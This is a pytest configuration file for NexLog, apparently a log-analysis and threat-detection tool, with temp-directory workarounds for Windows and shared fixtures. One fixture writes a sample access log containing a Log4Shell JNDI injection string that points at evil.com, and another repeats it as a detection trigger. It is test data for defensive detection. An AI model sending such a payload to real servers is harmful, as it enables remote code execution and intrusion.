"""
conftest.py - NexLog
pytest configuration. Lives at the project root so pytest auto-discovers
all test files across all layers without manual path setup.

Usage:
    pytest                           # run all tests
    pytest tests/unit/test_layer4.py # run one suite
    pytest -k "stix"                 # run tests matching keyword
    pytest -v                        # verbose output
    pytest --tb=short                # shorter tracebacks

All sys.path manipulation is handled inside each test file via
_find_project_root(), so conftest.py only needs to register the
project root once for pytest's collection machinery.
"""

import os
import shutil
import sys
import tempfile
import uuid
from pathlib import Path

import pytest


def _find_project_root() -> Path:
    """Walk up from conftest.py location to the project root."""
    current = Path(__file__).parent
    for _ in range(6):
        if (current / "nexlog" / "core").is_dir() and (current / "nexlog" / "detection").is_dir():
            return current
        if (current / "core").is_dir() and (current / "detection").is_dir():
            return current.parent if current.name == "nexlog" else current
        parent = current.parent
        if parent == current:
            break
        current = parent
    return Path(__file__).parent


_ROOT = _find_project_root()
_PYTEST_TMP_CAN_DELETE = True


def _path_is_usable_tmp_root(root: Path) -> tuple[bool, bool]:
    """Validate nested create/write/read behavior; report cleanup separately."""
    can_delete = True
    try:
        root.mkdir(parents=True, exist_ok=True)
        probe_dir = root / f".probe_{uuid.uuid4().hex}"
        probe_dir.mkdir(parents=True, exist_ok=False)
        probe_file = probe_dir / "write-test.txt"
        probe_file.write_text("ok", encoding="utf-8")
        if probe_file.read_text(encoding="utf-8") != "ok":
            return False, False
        try:
            probe_file.unlink(missing_ok=True)
            probe_dir.rmdir()
        except OSError:
            can_delete = False
        return True, can_delete
    except OSError:
        return False, False


def _choose_pytest_tmp_root() -> Path:
    """Pick a temp root that allows create/write/read on Windows."""
    global _PYTEST_TMP_CAN_DELETE
    candidates: list[Path] = []
    for env_name in ("NEXLOG_PYTEST_TMP_ROOT", "RUNNER_TEMP"):
        env_value = os.environ.get(env_name)
        if env_value:
            candidates.append(Path(env_value).expanduser() / f"run-{os.getpid()}")
    candidates.extend([
        _ROOT / "workspace" / "pytest-tmp-runs" / f"run-{os.getpid()}",
        Path(tempfile.gettempdir()) / "nexlog-pytest" / f"run-{os.getpid()}",
        Path("C:/tmp") / "nexlog-pytest" / f"run-{os.getpid()}",
    ])
    for candidate in candidates:
        usable, can_delete = _path_is_usable_tmp_root(candidate)
        if usable:
            _PYTEST_TMP_CAN_DELETE = can_delete
            return candidate
    fallback = _ROOT / "workspace" / "pytest-tmp-runs" / f"run-{os.getpid()}-fallback"
    fallback.mkdir(parents=True, exist_ok=True)
    usable, can_delete = _path_is_usable_tmp_root(fallback)
    if usable:
        _PYTEST_TMP_CAN_DELETE = can_delete
        return fallback
    raise RuntimeError("No writable pytest temp root available")


_PYTEST_TMP_ROOT = _choose_pytest_tmp_root()
for _env_name in ("TMP", "TEMP", "TMPDIR"):
    os.environ[_env_name] = str(_PYTEST_TMP_ROOT)
tempfile.tempdir = str(_PYTEST_TMP_ROOT)

_OriginalTemporaryDirectory = tempfile.TemporaryDirectory
_OriginalMkdtemp = tempfile.mkdtemp
_OriginalNamedTemporaryFile = tempfile.NamedTemporaryFile
_OriginalMktemp = tempfile.mktemp
_OriginalUnlink = os.unlink
_OriginalRemove = os.remove


def _is_under_pytest_tmp(path: str | os.PathLike[str]) -> bool:
    try:
        candidate = Path(path)
        if not candidate.is_absolute():
            candidate = Path.cwd() / candidate
        candidate.resolve(strict=False).relative_to(_PYTEST_TMP_ROOT.resolve(strict=False))
        return True
    except Exception:
        return False


def _sandbox_safe_unlink(path: str | os.PathLike[str], *, dir_fd=None) -> None:
    """
    Preserve real lock checks: if unlink is denied under the pytest temp root,
    require a successful rename before treating it as sandbox cleanup noise.
    """
    if dir_fd is not None:
        return _OriginalUnlink(path, dir_fd=dir_fd)
    try:
        return _OriginalUnlink(path)
    except PermissionError:
        if not _is_under_pytest_tmp(path):
            raise
        source = Path(path)
        if not source.exists() or not source.is_file():
            raise
        tombstone = source.with_name(f".delete-pending-{uuid.uuid4().hex}{source.suffix}")
        try:
            os.replace(source, tombstone)
        except OSError:
            if not _PYTEST_TMP_CAN_DELETE:
                return None
            raise


def _safe_mkdtemp(
    suffix: str | None = None,
    prefix: str | None = None,
    dir: str | os.PathLike[str] | None = None,
) -> str:
    """
    Create writable temp directories without relying on tempfile.mkdtemp ACLs.
    Some Windows runtimes create temp dirs that are not writable by the process.
    """
    base = Path(dir) if dir else _PYTEST_TMP_ROOT
    base.mkdir(parents=True, exist_ok=True)
    prefix = prefix or "tmp"
    suffix = suffix or ""
    for _ in range(256):
        candidate = base / f"{prefix}{uuid.uuid4().hex}{suffix}"
        try:
            candidate.mkdir(parents=False, exist_ok=False)
        except FileExistsError:
            continue
        usable, _can_delete = _path_is_usable_tmp_root(candidate)
        if usable:
            return str(candidate)
        try:
            shutil.rmtree(candidate, ignore_errors=True)
        except OSError:
            pass
    raise RuntimeError(f"Unable to create writable temporary directory under {base}")


def _safe_named_temporary_file(*args, **kwargs):
    base = Path(kwargs["dir"]) if kwargs.get("dir") else _PYTEST_TMP_ROOT
    base.mkdir(parents=True, exist_ok=True)
    kwargs["dir"] = str(base)
    return _OriginalNamedTemporaryFile(*args, **kwargs)


def _safe_mktemp(suffix: str = "", prefix: str = "tmp", dir: str | os.PathLike[str] | None = None) -> str:
    base = Path(dir) if dir else _PYTEST_TMP_ROOT
    base.mkdir(parents=True, exist_ok=True)
    return _OriginalMktemp(suffix=suffix, prefix=prefix, dir=str(base))


class _SafeTemporaryDirectory:
    """Avoid Windows cleanup permission races failing otherwise-passing tests."""

    def __init__(self, *args, **kwargs):
        self.name = _safe_mkdtemp(
            suffix=kwargs.pop("suffix", None),
            prefix=kwargs.pop("prefix", None),
            dir=kwargs.pop("dir", None),
        )
        self._ignore_cleanup_errors = kwargs.pop("ignore_cleanup_errors", True)

    def __enter__(self):
        return self.name

    def cleanup(self):
        try:
            shutil.rmtree(self.name, ignore_errors=self._ignore_cleanup_errors)
        except OSError:
            pass

    def __exit__(self, exc_type, exc, tb):
        self.cleanup()
        return False


tempfile.mkdtemp = _safe_mkdtemp
tempfile.TemporaryDirectory = _SafeTemporaryDirectory
tempfile.NamedTemporaryFile = _safe_named_temporary_file
tempfile.mktemp = _safe_mktemp
os.unlink = _sandbox_safe_unlink
os.remove = _sandbox_safe_unlink

# This file is a standalone debug script, not a pytest module.
collect_ignore = ["test_gui_headless.py"]
_workspace_dir = _ROOT / "workspace"
if _workspace_dir.is_dir():
    for _tmp_dir in _workspace_dir.glob("pytest-tmp-*"):
        try:
            _rel = _tmp_dir.relative_to(_ROOT)
            collect_ignore.append(_rel.as_posix())
        except ValueError:
            pass

# GUI unit tests validate import-safe stubs. Real GUI startup is covered by
# a separate smoke check so pytest does not open windows when PySide6 exists.
os.environ.setdefault("NEXLOG_GUI_STUBS", "1")

# Register every source directory on sys.path once so all
# test files can import project modules without repeating the setup.
_SOURCE_DIRS = [
    "core", "detection", "storage", "intelligence",
    "output", "utils", "interface/web", "interface/gui",
]
_APP_ROOT = _ROOT / "nexlog"
if str(_APP_ROOT) not in sys.path:
    sys.path.insert(0, str(_APP_ROOT))
for _p in _SOURCE_DIRS:
    _full = str(_APP_ROOT / _p)
    if _full not in sys.path:
        sys.path.insert(0, _full)

# Also add project root itself (for `import main`, `import output` etc.)
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))


# â”€â”€ pytest fixtures shared across all test files â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

from datetime import datetime, timezone


@pytest.fixture
def tmp_path() -> Path:
    """Return a writable temp directory without requiring Windows cleanup."""
    return Path(_safe_mkdtemp(prefix="pytest-"))


@pytest.fixture
def project_root() -> Path:
    """Return the project root Path."""
    return _ROOT


@pytest.fixture
def tmp_facase(tmp_path) -> Path:
    """Return a temporary .facase database path (auto-cleaned by pytest)."""
    return tmp_path / "test_case.facase"


@pytest.fixture
def tmp_log(tmp_path) -> Path:
    """Write a minimal Apache log file and return its path."""
    log = tmp_path / "test_access.log"
    log.write_text(
        '203.0.113.5 - - [04/Jan/2026:10:00:00 +0000] '
        '"GET /login?q=sqli HTTP/1.1" 200 512 "-" "sqlmap/1.7"\n'
        '185.220.100.5 - - [04/Jan/2026:10:00:01 +0000] '
        '"GET / HTTP/1.1" 200 100 "-" "${jndi:ldap://evil.com/x}"\n',
        encoding="utf-8",
    )
    return log


@pytest.fixture
def sample_findings():
    """Return a list of representative Finding objects for tests."""
    from finding import Finding, Severity, MitreTag
    ts = datetime(2026, 1, 4, 10, 0, 0, tzinfo=timezone.utc)
    return [
        Finding(
            rule_id="WEB-001", rule_name="SQL Injection",
            description="SQLi in login endpoint",
            severity=Severity.HIGH, confidence=0.90, category="web_attack",
            mitre_tags=[MitreTag("TA0001","Initial Access",
                                 "T1190","Exploit App",".001")],
            source_ip="203.0.113.5", hostname="web01",
            process_name="nginx", event_id="",
            timestamp=ts, trigger_line="GET /login?q=sqli",
            supporting_lines=["evidence line"],
        ),
        Finding(
            rule_id="AUTH-001", rule_name="SSH Brute Force",
            description="5+ failed SSH attempts",
            severity=Severity.CRITICAL, confidence=0.95, category="auth",
            mitre_tags=[MitreTag("TA0006","Credential Access",
                                 "T1110","Brute Force",".001")],
            source_ip="185.220.100.5", hostname="bastion01",
            process_name="sshd", event_id="",
            timestamp=ts, trigger_line="Failed password for root",
            supporting_lines=[],
        ),
        Finding(
            rule_id="DISC-008", rule_name="Log4Shell Attempt",
            description="JNDI injection in User-Agent",
            severity=Severity.CRITICAL, confidence=0.96, category="discovery",
            mitre_tags=[MitreTag("TA0001","Initial Access",
                                 "T1190","Exploit App",None)],
            source_ip="1.2.3.4", hostname="app01",
            process_name="java", event_id="",
            timestamp=ts,
            trigger_line="${jndi:ldap://evil.com/x}",
            supporting_lines=[],
        ),
    ]


@pytest.fixture
def sample_iocs(sample_findings):
    """Return IOCs extracted from sample_findings."""
    from ioc_extractor import IOCExtractor
    return IOCExtractor(include_private_ips=False).extract(sample_findings)


@pytest.fixture
def populated_db(tmp_facase, sample_findings):
    """
    Return an open CaseDB pre-populated with one session + findings.
    Caller must close it. Use as a context manager for safety:
        with populated_db as db:
            ...
    """
    from case_db import CaseDB
    db  = CaseDB(tmp_facase).open()
    sid = db.create_session(
        source_file="test.log", sha256="a"*64,
        file_size=4096, rules_loaded=162, entries_parsed=100,
    )
    db.save_findings(sample_findings, sid)
    db.record_evidence("test.log","a"*64,4096,sid,"apache",100,3)
    db.add_note("Pytest auto-populated session", sid, "pytest")
    # Store session_id for retrieval
    db._pytest_session_id = sid
    return db


# â”€â”€ pytest collection configuration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def pytest_configure(config):
    """Add custom markers."""
    if not _PYTEST_TMP_CAN_DELETE:
        import warnings

        warnings.warn(
            f"Pytest temp root is writable but cleanup is best-effort: {_PYTEST_TMP_ROOT}",
            RuntimeWarning,
            stacklevel=2,
        )
    config.addinivalue_line("markers",
        "layer1: tests for Layer 1 (parsing engine)")
    config.addinivalue_line("markers",
        "layer2: tests for Layer 2 (detection engine)")
    config.addinivalue_line("markers",
        "layer3: tests for Layer 3 (storage / IOC / report)")
    config.addinivalue_line("markers",
        "layer4: tests for Layer 4 (PDF / STIX / export)")
    config.addinivalue_line("markers",
        "layer5: tests for Layer 5 (API / GUI)")
    config.addinivalue_line("markers",
        "integration: end-to-end pipeline tests")
    config.addinivalue_line("markers",
        "slow: tests that build PDFs or run full analysis pipelines")
    config.addinivalue_line("markers",
        "ai: tests for the AI query engine (ai/ package)")


@pytest.fixture
def ai_persist_dir(tmp_path) -> Path:
    """
    Return a temporary directory for AI vector store persistence.
    Auto-cleaned by pytest after the test.
    """
    ai_dir = tmp_path / "ai_store"
    ai_dir.mkdir()
    return ai_dir


@pytest.fixture
def ai_engine(ai_persist_dir, sample_findings):
    """
    Return a fully initialised AIQueryEngine with sample_findings indexed.
    Uses tier 3 (TF-IDF) and tier 3 (template) â€” no external deps required.
    Yields the engine; closes it after the test.
    """
    import sys
    sys.path.insert(0, str(_ROOT / "ai"))
    from query_interface import AIQueryEngine

    engine = AIQueryEngine(persist_path=str(ai_persist_dir))
    engine.index_findings_directly(sample_findings, session_id="test-session")
    yield engine
    engine.close()


@pytest.fixture
def ai_engine_empty(ai_persist_dir):
    """
    Return an AIQueryEngine with nothing indexed.
    Useful for testing empty-store behaviour.
    """
    import sys
    sys.path.insert(0, str(_ROOT / "ai"))
    from query_interface import AIQueryEngine

    engine = AIQueryEngine(persist_path=str(ai_persist_dir))
    yield engine
    engine.close()


def pytest_collection_modifyitems(session, config, items):
    """
    Auto-mark test items based on their file path so markers work
    without decorating every test function individually.
    """
    layer_map = {
        "test_layer1":    "layer1",
        "test_layer2":    "layer2",
        "test_layer3":    "layer3",
        "test_layer4":    "layer4",
        "test_layer5":    "layer5",
        "test_ai":        "ai",
        "test_full_pipeline": "integration",
    }
    slow_files = {"test_layer4", "test_full_pipeline", "test_ai"}

    import pytest as _pytest
    for item in items:
        fname = Path(item.fspath).stem
        for prefix, marker in layer_map.items():
            if fname.startswith(prefix):
                item.add_marker(getattr(_pytest.mark, marker))
        if fname in slow_files:
            item.add_marker(_pytest.mark.slow)
